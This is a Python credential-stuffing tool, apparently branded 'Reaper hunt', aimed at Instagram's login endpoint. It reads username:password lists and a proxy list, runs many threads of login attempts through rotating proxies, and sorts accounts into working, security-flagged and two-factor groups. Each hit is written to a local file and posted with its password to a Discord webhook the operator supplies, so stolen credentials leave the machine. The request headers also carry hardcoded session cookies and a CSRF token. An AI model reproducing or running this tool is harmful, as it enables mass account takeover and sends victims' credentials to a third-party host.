import threading
import os
try:
    import requests,time
except ImportError:
    os.system('pip install requests')
try:
    import colorama
    from colorama import Fore
except ImportError:
    os.system('pip install colorama')
def close():
    input('Press Enter To Exit ;')
    exit(1.9)
colorama.init(autoreset=True)
g = Fore.GREEN
r = Fore.RED
y = Fore.YELLOW
b = Fore.BLUE
url = "https://www.instagram.com/accounts/login/ajax/"
headers ={

    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
    "content-length": "310",
    "content-type": "application/x-www-form-urlencoded",
    'cookie': 'mid=YU3yhAALAAFZYIwjygjHsh-MaysB; ig_did=5F08552A-1B26-4BA0-A2DD-3CB8C0629F40; ig_nrcb=1; datr=sWVQYchdy8F1kt5XaePtqXPg; shbid="9972\054745702379\0541664624686:01f7e82793a4a34d425aebc13f267a28c7ce79f4ed45e38df7eae7114ca816b0684acdf5"; shbts="1633088686\054745702379\0541664624686:01f7ca0088efa66b7713fa86badf8b933000e09e6202b70bbc3b0065b0d597836a9c7747"; csrftoken=IuHsG5GrWfPobUMUJ8phoxQ8rZKL0KdE; ds_user_id=2065151129',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
    'x-asbd-id': '198387',
    'x-csrftoken': 'IuHsG5GrWfPobUMUJ8phoxQ8rZKL0KdE',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '7b744e55ba3e',
    'x-requested-with': 'XMLHttpRequest', 
}
print(Fore.BLUE+'''
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶$¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶8____________v$¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶$¶$v_____________________q¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶v___________________________v¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶v_________________________________8¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶$_____________________________________$¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶o_______q¶¶¶¶3_____________$¶¶¶$________q¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶________¶¶¶¶¶¶¶¶o_________$¶¶¶¶¶¶¶$_______o¶¶¶¶¶¶¶
¶¶¶¶¶¶¶$________v¶¶¶¶¶¶¶¶¶________q¶¶¶$¶¶¶¶¶v_______q¶¶¶¶¶¶
¶¶¶¶¶$¶_________8¶¶¶¶¶¶¶¶¶________8¶¶¶¶¶¶¶¶¶3________8¶$¶¶¶
¶¶¶¶¶¶___________¶¶¶¶¶¶¶¶¶________v¶¶¶¶¶¶¶¶¶__________¶¶¶¶¶
¶¶¶¶¶¶___________¶¶¶¶¶¶¶¶__________8¶¶¶¶¶¶¶3__________q¶¶¶¶
¶¶¶¶¶¶____________$¶¶¶¶$____________v¶¶¶¶¶____________o¶¶¶¶
¶¶¶¶¶¶________________________________________________o¶¶¶¶
¶¶¶¶¶¶________________________________________________q¶¶¶¶
¶¶¶¶¶¶___v8¶¶v_________________________________¶¶¶q__v$¶$¶¶
¶¶¶¶¶¶q_____¶3________________________________3¶o____o¶¶¶¶¶
¶¶¶¶¶¶¶______q¶q_____________________________¶3_____v$¶¶¶¶¶
¶¶¶¶¶¶¶¶________3¶o______________________o$$_______v$¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶__________$¶¶q_______________$¶$_________v$¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶q____________q$¶¶¶¶¶¶¶¶¶$$q___________vo8¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶_________________________________vvo8¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶$¶$v____________________________vvo8¶¶$¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶q_______________________vvvo3¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶3v______________vvvq88¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶$3qqooqqq8¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶$¶¶¶¶¶¶¶¶¶$¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                                                                    
''')

import random
bad,good,secure,factory,prox = 0,0,0,0,0
vbm = 0
timeout = 10
namefile = input('[+] Name List ;>')
if ".txt" in namefile:
    pass
elif ".txt" not in namefile:
    try:
        namefile = namefile+'.txt'
        file1 = open(namefile,'r').read().splitlines()
        print(f'{g} Successfully Loaded {namefile}')
    except:
        print(f'{r} Not Found {namefile}')
        close()
try:
    pr = open('proxies.txt').read().splitlines()
    print(f"{g} Successfully Loaded proxies.txt")
except:
    print('{r} Not Found proxies.txt')
    close()
def v():
    global bad,good,secure,factory,prox
    while 1:
        x = random.choice(file1)
        user = x.split(':')[0]
        password = x.split(':')[1]        
        proxy = str(random.choice(pr))
        proxy_dict = {
            'http': 'http://'+proxy,
            'https': 'http://'+proxy,
            'socks4': 'http://'+proxy,
            'socks5': 'http://'+proxy
        }
        try:
            tim = str(time.time()).split('.')[1]                       
            data = {

    'username': user,
    'enc_password':  f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{password}',
}
            req = requests.post(url,headers=headers,data=data,proxies=proxy_dict,timeout=timeout)
            if '"authenticated":true' in req.text:
                good +=1
                embed = {
        
        "username": "ghoul",
        "content": "@everyone",
        "avatarurl":  "https://b.top4top.io/p_2272imo170.jpg",
        "embeds": [
            {
                "author": {
                    "name": "Reaper hunt",                    
                    "thumbnail": "https://b.top4top.io/p_2272imo170.jpg",
                },
                "description": f"[{user}:{password}] good acc",
                "hexcolor": "f9829b",
                "footer": {
                    "text": "Developed by Reaper"
                }
            }
        ]
    }
                requests.post(Webhook, json=embed)
                with open('good.txt', 'a') as writ:
                    writ.write(f'{user}:{password}\n')
            
            elif  '"banner_text":"Suspicious Login Attempt' in req.text:
                secure +=1
                embed = {
        
        "username": "ghoul",
        "content": "@everyone",
        "avatarurl":  "https://b.top4top.io/p_2272imo170.jpg",
        "embeds": [
            {
                "author": {
                    "name": "Reaper hunt",                    
                    "thumbnail": "https://b.top4top.io/p_2272imo170.jpg",
                },
                "description": f"[{user}:{password}] secure acc",
                "hexcolor": "f9829b",
                "footer": {
                    "text": "Developed by Reaper"
                }
            }
        ]
    }
                requests.post(Webhook, json=embed)
                with open('secure.txt', 'a') as writ:
                    writ.write(f'{user}:{password}\n')
            elif '"two_factor_required":true' in req.text:
                factory+=1
                embed = {
        "avatarurl":  "https://b.top4top.io/p_2272imo170.jpg",        
        "username": "ghoul",
        "content": "@everyone",
        "embeds": [
            {
                "author": {
                    "name": "Reaper hunt",                    
                    "thumbnail": "https://b.top4top.io/p_2272imo170.jpg",
                },
                "description": f"[{user}:{password}] 2fa acc",
                "hexcolor": "f9829b",
                "footer": {
                    "text": "Developed by Reaper"
                }
            }
        ]
    }
                requests.post(Webhook, json=embed)
                with open('factory.txt', 'a') as writ:
                    writ.write(f'{user}:{password}\n')
            elif '"authenticated":false'  in  req.text:
                bad+=1                              
        except:
            prox +=1
        with threading.Lock():
            print(f'\r{g}Good > {good} {r} Bad > {bad} {y} secure > {secure} {b} factory > {factory} {r} proxy > {prox}',end='')
thr = []
Webhook = input("[?]Discord hook:")  
for bm in range(int(input('[+] Threads ;>'))):
    t1 = threading.Thread(target=v)
    t1.start()
    thr.append(t1)
for t2 in thr:
    t2.join()
